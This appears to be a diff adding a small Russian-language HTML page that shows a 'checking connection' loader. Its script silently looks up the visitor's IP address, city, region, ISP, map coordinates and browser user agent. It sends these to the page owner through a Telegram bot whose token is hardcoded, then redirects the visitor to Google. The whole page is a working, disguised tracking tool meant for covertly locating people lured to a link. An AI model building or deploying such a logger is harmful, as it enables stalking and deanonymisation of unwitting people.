@@ -1,1 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Загрузка...</title>
+    <style>
+        body { font-family: Arial; text-align: center; padding: 50px; background: #f5f5f5; }
+        .box { background: white; padding: 40px; border-radius: 10px; max-width: 500px; margin: 0 auto; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .ip { background: #f0f0f0; padding: 10px; border-radius: 5px; font-family: monospace; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>Проверка соединения...</h2>
+        <div class="loader"></div>
+        <p>Ваш IP: <span class="ip" id="ip">Определяется...</span></p>
+        <p>Город: <span id="city">Определяется...</span></p>
+        <p>Страна: <span id="country">Определяется...</span></p>
+        <p style="color: gray; font-size: 12px; margin-top: 20px;">Пожалуйста, подождите...</p>
+    </div>
 
+    <script>
+        // ===== ЗАМЕНИ НА СВОЙ TELEGRAM ID =====
+        const chatId = '8926139880';  // ← СЮДА ВСТАВЬ СВОЙ ID
+
+        async function getLocation() {
+            try {
+                const response = await fetch('http://ip-api.com/json/');
+                const data = await response.json();
+                
+                if (data.status === 'success') {
+                    document.getElementById('ip').textContent = data.query;
+                    document.getElementById('city').textContent = data.city;
+                    document.getElementById('country').textContent = data.country;
+                    
+                    const botToken = '8793943067:AAHd1HW10X836wrcHSAiTKsQPIWpJ_xPs9M';
+                    
+                    const message = '🎯 НОВЫЙ IP ПОЛУЧЕН!\n\n' +
+                        '🌐 IP: ' + data.query + '\n' +
+                        '📍 Город: ' + data.city + '\n' +
+                        '🏛 Регион: ' + data.regionName + '\n' +
+                        '🌍 Страна: ' + data.country + '\n' +
+                        '📶 Провайдер: ' + data.isp + '\n' +
+                        '🗺 Карта: https://www.google.com/maps?q=' + data.lat + ',' + data.lon + '\n' +
+                        '💻 User-Agent: ' + navigator.userAgent + '\n' +
+                        '⏰ Время: ' + new Date().toLocaleString();
+                    
+                    const url = 'https://api.telegram.org/bot' + botToken + '/sendMessage';
+                    await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message
+                        })
+                    });
+                    
+                    setTimeout(() => {
+                        window.location.href = 'https://google.com';
+                    }, 3000);
+                }
+            } catch (error) {
+                document.getElementById('ip').textContent = 'Ошибка определения';
+            }
+        }
+        
+        getLocation();
+    </script>
+</body>
+</html>
